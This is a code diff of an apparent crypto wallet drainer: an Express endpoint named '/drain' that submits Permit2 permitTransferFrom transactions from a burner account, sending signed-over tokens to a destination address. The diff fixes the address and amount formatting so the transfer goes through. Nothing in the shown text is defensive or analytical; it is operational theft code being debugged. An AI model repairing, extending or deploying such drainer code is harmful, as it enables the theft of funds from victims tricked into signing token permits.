@@ -208,18 +208,18 @@ app.post('/drain', async (req, res) => {
 
   // 🔥 EXECUTE
   const tx = await permit2.permitTransferFrom(
-    permitDetails,
-    {
-      to: destination,
-      requestedTokenAmount: permitDetails.amount
-    },
-    signature,
-    {
-      gasLimit,
-      gasPrice,
-      nonce: burnerNonce  // 🔥 FRESH NONCE
-    }
-  );
+  permitDetails,
+  {
+    to: ethers.utils.getAddress(destination),           // ✅ FIX 1
+    requestedTokenAmount: ethers.BigNumber.from(permitDetails.amount)  // ✅ FIX 2
+  },
+  signature,
+  {
+    gasLimit,
+    gasPrice,
+    nonce: burnerNonce
+  }
+);
   
   const receipt = await tx.wait();
   
